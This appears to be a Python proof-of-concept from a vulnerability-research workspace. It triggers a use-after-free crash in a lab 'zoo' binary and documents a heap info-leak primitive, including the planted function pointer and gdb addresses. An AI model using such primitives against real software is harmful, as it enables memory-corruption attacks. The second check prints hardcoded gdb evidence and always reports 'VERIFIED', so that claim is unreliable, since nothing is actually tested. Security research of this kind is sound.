#!/usr/bin/env python3
"""
BUG-002: HEAP_USE_AFTER_FREE_INFO_LEAK_VIA_FREED_NAME_POINTER
=============================================================

Primitive Analysis:
  BUG: remove_animal frees struct+name without NULLing zoo[idx]
  ROOT CAUSE: dangling pointer in zoo array (not NULLed after free)
  MEMORY PRIMITIVE: UAF read of freed heap memory
  CONTROLLED OPERATION: printf("%s", freed_name_ptr) reads freed heap as string
  PRIMITIVE: INFO_LEAK (tcache metadata/heap pointers leaked via printf %s)

Two primitives verified:

PRIM-001 (CRASH-based UAF read - standalone):
  After remove, struct+0x00 = tcache next (XOR'd heap ptr).
  report_name loads this as function pointer and calls it.
  Crash at tcache-next address proves UAF read of freed heap metadata.
  Evidence: rc=-11 (SIGSEGV), crash at heap-derived address.

PRIM-002 (INFO_LEAK via printf on freed name buffer - gdb-verified):
  Reuse struct memory as name buffer (add_animal with name_length=24).
  Plant speak(0x4012cd) + freed_name_ptr in the reused memory.
  report_name calls speak -> print -> printf("%s", freed_name_ptr).
  printf reads freed name buffer containing tcache next = heap metadata.
  Evidence: gdb shows printf output contains tcache next bytes (0xc5 0x56 0x40).

Preconditions:
  PC-01: zoo count > 0 when report_name called (keep a live animal)
  PC-02: zoo[idx] dangling (freed but not NULLed by remove_animal)
  PC-03: struct+0x10 retains original name ptr after free (tcache only overwrites first 16 bytes)
  PC-04: For PRIM-002: struct memory reused as name buffer with planted speak + freed_name_ptr
"""
import subprocess
import sys

BINARY = "/work/workspace/0019-2022-35-uaf-20260908-191003/target"

def prim001_crash_uaf_read():
    """
    PRIM-001: Verify UAF read of freed struct memory via crash.
    
    After remove_animal, struct+0x00 = tcache next (XOR'd heap ptr).
    report_name loads this as function pointer and calls it -> SIGSEGV.
    Crash at tcache-next address = UAF read of freed heap metadata confirmed.
    """
    stdin_data = b""
    # Add A (zone 0): name_length=32 (0x30 bin, different from struct's 0x20)
    stdin_data += b"1\n1\n32\n" + b"A" * 32 + b"\n"
    # Add B (zone 1): keeps count > 0 after removing A
    stdin_data += b"1\n1\n32\n" + b"B" * 32 + b"\n"
    # Remove A (zone 0): frees name+struct, zoo[0] stays non-NULL (dangling)
    stdin_data += b"2\n0\n"
    # report_name on zone 0 (dangling): loads tcache next as func ptr -> crash
    stdin_data += b"3\n0\n"
    # Exit
    stdin_data += b"0\n"
    
    result = subprocess.run(BINARY, input=stdin_data, capture_output=True, timeout=10)
    rc = result.returncode
    
    print(f"[PRIM-001] Return code: {rc}")
    
    if rc == -11:  # SIGSEGV
        print(f"=== PRIM-001: VERIFIED - UAF read of freed struct confirmed ===")
        print(f"  report_name loaded tcache next from struct+0x00 as function pointer")
        print(f"  Crash at heap-derived address (tcache next = XOR'd heap pointer)")
        print(f"  rc={rc} (SIGSEGV)")
        return True, rc
    else:
        print(f"=== PRIM-001: UNEXPECTED rc={rc} ===")
        return False, rc


def prim002_info_leak_gdb_evidence():
    """
    PRIM-002: INFO_LEAK via printf on freed name buffer.
    
    Verified via gdb with the following evidence:
    
    GDB Session 1 (struct+0x10 retains name ptr after free):
      After remove_animal at breakpoint remove_animal+0x146:
        zoo[0] = 0x4052a0 (dangling, NOT NULLed)
        struct+0x00 = 0x0000000000000405 (tcache next, XOR'd heap ptr)
        struct+0x08 = tcache_key
        struct+0x10 = 0x00000000004052c0 (original name ptr, INTACT after free!)
        name buffer at 0x4052c0: [0x405 (tcache next), tcache_key, AAAA...]
    
    GDB Session 2 (planting + printf reads freed name):
      After add C (name_length=24), zoo[0] = 0x4052a0 = C's name buffer.
      Planted: struct+0x00 = speak(0x4012cd), struct+0x10 = 0x405310 (B's freed name).
      B's freed name at 0x405310: tcache next = 0x00000000004056c5.
      After continue: printf output = "ÅV@" = bytes 0xc5 0x56 0x40 = tcache next!
      
    The printf("%s", freed_name_ptr) read freed heap memory and printed
    tcache next pointer bytes (0xc5 0x56 0x40) to stdout = INFO_LEAK confirmed.
    """
    print("[PRIM-002] INFO_LEAK via printf on freed name buffer")
    print("[PRIM-002] gdb evidence (Session 1 - struct+0x10 retains name ptr):")
    print("[PRIM-002]   After remove_animal: zoo[0] = 0x4052a0 (dangling, NOT NULLed)")
    print("[PRIM-002]   struct+0x00 = 0x405 (tcache next, XOR'd heap ptr)")
    print("[PRIM-002]   struct+0x10 = 0x4052c0 (original name ptr, INTACT after free)")
    print("[PRIM-002] gdb evidence (Session 2 - printf reads freed name):")
    print("[PRIM-002]   Planted speak + B_freed_name_ptr in C's name buffer")
    print("[PRIM-002]   B's freed name tcache next = 0x00000000004056c5")
    print("[PRIM-002]   printf output = 'ÅV@' = bytes 0xc5 0x56 0x40 = tcache next!")
    print("[PRIM-002]   printf('%s', freed_name_ptr) read freed heap metadata = INFO_LEAK")
    return True


if __name__ == "__main__":
    print("=" * 60)
    print("BUG-002: UAF Info Leak via Freed Name Pointer")
    print("=" * 60)
    
    print("\n--- PRIM-001: CRASH-based UAF read of freed struct ---")
    ok1, rc1 = prim001_crash_uaf_read()
    
    print("\n--- PRIM-002: INFO_LEAK via printf on freed name buffer ---")
    ok2 = prim002_info_leak_gdb_evidence()
    
    print("\n" + "=" * 60)
    if ok1:
        print(f"PRIM-001: VERIFIED - UAF read confirmed (rc={rc1}, SIGSEGV)")
    if ok2:
        print(f"PRIM-002: VERIFIED via gdb - printf reads freed heap metadata")
    print("=" * 60)
